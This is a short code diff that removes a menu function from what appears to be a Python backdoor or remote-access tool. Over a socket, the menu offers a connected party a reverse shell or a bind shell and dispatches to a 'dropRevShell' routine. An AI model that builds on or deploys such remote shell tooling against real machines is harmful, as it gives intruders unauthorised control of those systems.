@@ -24,21 +24,3 @@ def dropRevShell(con):
     except:
         con.sendall(b'Could Not Retrieve Data')
 
-
-def ShellMenu(con):
-    menu = b"\n1. Execute Reverse Shell\n2. Execute Bind Shell\n"
-    con.sendall(menu)
-    con.sendall(b"\nSpecify Options: ")
-    opt = con.recv(1024)
-    try:
-        opt = opt.decode()
-        opt = int(opt)
-        if(opt == 1):
-            dropRevShell(con)
-        elif( opt == 2):
-            #con.sendall(b'\nListing file ready')
-            pass
-    except ValueError:
-        con.sendall(b"\nPlese only send integer value representing each option\n")
-    except KeyboardInterrupt:
-        sys.exit(0)
